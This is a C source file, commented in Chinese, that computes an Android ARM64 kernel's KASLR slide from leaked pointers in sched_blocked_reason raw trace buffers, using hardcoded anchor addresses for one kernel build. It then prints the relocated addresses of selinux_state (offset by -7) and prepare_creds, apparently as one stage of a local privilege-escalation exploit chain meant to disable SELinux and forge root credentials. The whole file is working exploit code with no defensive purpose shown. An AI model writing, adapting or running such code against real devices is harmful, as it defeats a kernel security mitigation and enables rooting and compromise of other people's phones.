/*
 * kaslr_slide.c —— 从 sched_blocked_reason raw trace 推导当前 boot 的 KASLR slide。
 *
 * 输入（grab.sh 产物）：
 *   /data/local/tmp/bl_text.txt   caller=<func>+0x..
 *   /data/local/tmp/bl_<cpu>.bin  trace_pipe_raw
 *
 * 输出：
 *   KASLR_SLIDE=0x..
 *   SELINUX_ARG=0x..     (selinux_state - 7)
 *   PREPARE=0x..         (prepare_creds)
 */
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

struct anchor {
    const char *name;
    uint64_t link;
};

static const struct anchor anchors[] = {
    {"worker_thread", 0xffffffc080207bc8ULL},
    {"rcu_gp_fqs_loop", 0xffffffc08018dbfcULL},
    {"rcu_gp_kthread", 0xffffffc08018d6f4ULL},
    {"folio_wait_bit_common", 0xffffffc0802e798cULL},
    {"ufshcd_issue_dev_cmd", 0xffffffc080e55658ULL},
    {"icc_set_bw", 0xffffffc08037a2b8ULL},
};

#define SELINUX_STATE 0xffffffc0827e7a60ULL
#define PREPARE_CREDS 0xffffffc0801935b8ULL

static int cmp_u64(const void *a, const void *b)
{
    uint64_t x = *(const uint64_t *)a, y = *(const uint64_t *)b;
    return x < y ? -1 : x > y;
}

int main(int argc, char **argv)
{
    const char *dir = argc > 1 ? argv[1] : "/data/local/tmp";
    char path[512];
    uint64_t targets[64];
    uint8_t target_anchor[64];
    size_t target_count = 0;

    snprintf(path, sizeof path, "%s/bl_text.txt", dir);
    FILE *text = fopen(path, "r");
    if (!text) { printf("KASLR_ERROR=no_text\n"); return 2; }
    char line[2048];
    while (fgets(line, sizeof line, text)) {
        const char *caller = strstr(line, "caller=");
        if (!caller) continue;
        caller += 7;
        for (size_t a = 0; a < sizeof(anchors) / sizeof(anchors[0]); a++) {
            size_t n = strlen(anchors[a].name);
            if (strncmp(caller, anchors[a].name, n) != 0 || caller[n] != '+')
                continue;
            const char *off = strstr(caller + n, "+0x");
            if (!off) continue;
            uint64_t target = anchors[a].link + strtoull(off + 3, NULL, 16);
            int found = 0;
            for (size_t i = 0; i < target_count; i++)
                if (targets[i] == target) found = 1;
            if (!found && target_count < 64) {
                target_anchor[target_count] = (uint8_t)a;
                targets[target_count++] = target;
            }
        }
    }
    fclose(text);
    if (target_count == 0) { printf("KASLR_ERROR=no_anchor\n"); return 2; }

    size_t cap = 1 << 16, n = 0;
    uint64_t *cands = malloc(cap * sizeof(uint64_t));
    if (!cands) return 2;
    uint64_t total_bytes = 0;
    for (int cpu = 0; cpu < 8; cpu++) {
        snprintf(path, sizeof path, "%s/bl_%d.bin", dir, cpu);
        FILE *fp = fopen(path, "rb");
        if (!fp) continue;
        fseek(fp, 0, SEEK_END);
        long sz = ftell(fp);
        rewind(fp);
        if (sz <= 0) { fclose(fp); continue; }
        uint8_t *data = malloc((size_t)sz);
        if (!data) { fclose(fp); continue; }
        size_t got = fread(data, 1, (size_t)sz, fp);
        fclose(fp);
        total_bytes += got;
        for (size_t i = 0; i + 8 <= got; i += 4) {
            uint64_t v;
            memcpy(&v, data + i, 8);
            if (v < 0xffffff8000000000ULL || v >= 0xfffffff000000000ULL) continue;
            for (size_t t = 0; t < target_count; t++) {
                if (v < targets[t]) continue;
                uint64_t c = v - targets[t];
                if (c == 0 || c >= (1ULL << 42) || (c & 0x1fffffULL)) continue;
                if (n == cap) { cap *= 2; cands = realloc(cands, cap * sizeof(uint64_t)); }
                cands[n++] = c;
            }
        }
        free(data);
    }
    if (n == 0) { printf("KASLR_ERROR=no_candidate bytes=%llu\n", (unsigned long long)total_bytes); return 2; }
    qsort(cands, n, sizeof(uint64_t), cmp_u64);
    uint64_t best = 0;
    size_t best_n = 0, second_n = 0;
    for (size_t i = 0; i < n;) {
        size_t j = i + 1;
        while (j < n && cands[j] == cands[i]) j++;
        size_t votes = j - i;
        if (votes > best_n) {
            second_n = best_n;
            best_n = votes;
            best = cands[i];
        } else if (votes > second_n) {
            second_n = votes;
        }
        i = j;
    }
    free(cands);

    /* Re-scan by anchor identity: repeated hits from one anchor are not
     * independent corroboration. require at least two anchors. */
    uint32_t anchor_mask = 0;
    for (int cpu = 0; cpu < 8; cpu++) {
        snprintf(path, sizeof path, "%s/bl_%d.bin", dir, cpu);
        FILE *fp = fopen(path, "rb");
        if (!fp) continue;
        fseek(fp, 0, SEEK_END);
        long sz = ftell(fp);
        rewind(fp);
        if (sz <= 0) { fclose(fp); continue; }
        uint8_t *data = malloc((size_t)sz);
        if (!data) { fclose(fp); continue; }
        size_t got = fread(data, 1, (size_t)sz, fp);
        fclose(fp);
        for (size_t i = 0; i + 8 <= got; i += 4) {
            uint64_t v;
            memcpy(&v, data + i, 8);
            if (v < 0xffffff8000000000ULL || v >= 0xfffffff000000000ULL) continue;
            for (size_t t = 0; t < target_count; t++) {
                if (v == targets[t] + best)
                    anchor_mask |= (1u << target_anchor[t]);
            }
        }
        free(data);
    }
    int distinct_anchors = 0;
    for (unsigned int i = 0; i < sizeof(anchors) / sizeof(anchors[0]); i++)
        if (anchor_mask & (1u << i)) distinct_anchors++;

    printf("KASLR_SLIDE=0x%llx\n", (unsigned long long)best);
    printf("KASLR_VOTES=%zu\n", best_n);
    printf("KASLR_SECOND=%zu\n", second_n);
    printf("KASLR_ANCHORS=%d\n", distinct_anchors);
    printf("KASLR_BYTES=%llu\n", (unsigned long long)total_bytes);
    printf("SELINUX_ARG=0x%llx\n", (unsigned long long)(SELINUX_STATE + best - 7));
    printf("PREPARE=0x%llx\n", (unsigned long long)(PREPARE_CREDS + best));
    if (best_n < 3) {
        printf("KASLR_ERROR=too_few_votes\n");
        return 2;
    }
    if (second_n == best_n) {
        printf("KASLR_ERROR=tie\n");
        return 2;
    }
    if (distinct_anchors < 2) {
        printf("KASLR_ERROR=too_few_anchors\n");
        return 2;
    }
    return 0;
}
